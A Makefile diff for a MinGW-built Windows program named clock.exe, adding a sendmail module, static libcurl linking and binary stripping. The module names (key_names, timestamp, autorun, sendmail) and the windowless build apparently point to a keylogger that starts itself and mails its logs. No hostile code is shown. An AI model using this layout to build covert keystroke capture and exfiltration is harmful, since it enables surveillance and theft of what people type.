@@ -1,20 +1,26 @@
-SRCMODULES = key_names.c timestamp.c autorun.c main.c
+SRCMODULES = key_names.c timestamp.c autorun.c sendmail.c main.c
 OBJMODULES = $(SRCMODULES:.c=.obj)
 HEADERS = $(SRCMODULES:.c=.h)
 EXEC_FILE = clock.exe
 
 WINDRES = i686-mingw32-windres
-CC = i686-mingw32-gcc
+CC =      i686-mingw32-gcc
+STRIP =   i686-mingw32-strip
 
-#DEFINE = $(DEFINE) -DDEBUG
+DEFINE = -DCURL_STATICLIB
+#DEFINE += -DDEBUG
 
-CFLAGS = -Wall -Wextra -std=c99 -mwindows $(DEFINE)
+CFLAGS = -Wall -Wextra -std=gnu99 -pedantic -mwindows -Imingw/include $(DEFINE)
+LDFLAGS = -static -Lmingw/lib -lcurl -lws2_32
 CFLAGS_MAIN = $(CFLAGS) -Wno-unused-parameter
 
 default: $(EXEC_FILE)
 
-main.obj: main.c
+main.obj: main.c main.h
 	$(CC) $(CFLAGS_MAIN) -c $< -o $@
+
+sendmail.obj: sendmail.c sendmail.h sendmail_config.h
+	$(CC) $(CFLAGS) -c $< -o $@
 
 %.obj: %.c %.h
 	$(CC) $(CFLAGS) -c $< -o $@
@@ -23,7 +29,8 @@ resource.o: resource.rc
 	$(WINDRES) $< -o $@
 
 $(EXEC_FILE): $(OBJMODULES) resource.o
-	$(CC) $(CFLAGS) $^ -o $@
+	$(CC) $(CFLAGS) $^ $(LDFLAGS) -o $@
+	$(STRIP) $@
 
 ifneq (clean, $(MAKECMDGOALS))
 ifneq (clang_analyze_clean, $(MAKECMDGOALS))
